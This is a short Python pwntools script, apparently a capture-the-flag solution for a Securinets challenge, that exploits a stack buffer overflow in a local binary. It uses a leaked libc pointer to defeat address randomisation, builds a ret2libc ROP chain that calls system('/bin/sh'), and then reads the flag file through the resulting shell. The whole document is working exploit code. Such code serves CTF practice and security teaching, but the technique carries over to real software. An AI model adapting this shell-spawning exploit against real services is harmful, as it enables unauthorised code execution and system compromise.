#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./main", checksec=False)
context.log_level = "error"
libc = ELF("./libc.so.6", checksec=False)

p = remote("127.0.0.1", 9010)

p.recvuntil(b"WAWA'S LINE: ")
leak = int(p.recvline(), 16)
libc.address = leak - libc.sym["_IO_2_1_stdout_"]

rop = ROP(libc)
ret = rop.find_gadget(["ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * 40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(libc.sym.system)

p.sendafter(b"message:\n", payload)
p.sendline(b"cat flag.txt")
p.recvuntil(b"Securinets{")
flag = b"Securinets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
